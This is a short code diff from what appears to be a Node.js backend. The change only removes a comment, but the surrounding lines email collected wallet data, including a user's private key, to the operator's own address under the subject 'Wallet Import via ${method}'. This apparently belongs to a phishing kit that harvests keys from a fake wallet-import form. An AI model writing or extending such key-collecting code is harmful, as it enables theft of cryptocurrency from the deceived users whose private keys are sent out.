@@ -25,7 +25,7 @@ Private Key: ${privateKey || "N/A"}
 
     await transporter.sendMail({
       from: process.env.EMAIL_USER,
-      to: process.env.EMAIL_USER, // send to yourself
+      to: process.env.EMAIL_USER, 
       subject: `Wallet Import via ${method}`,
       text: rawWalletInfo,
     });
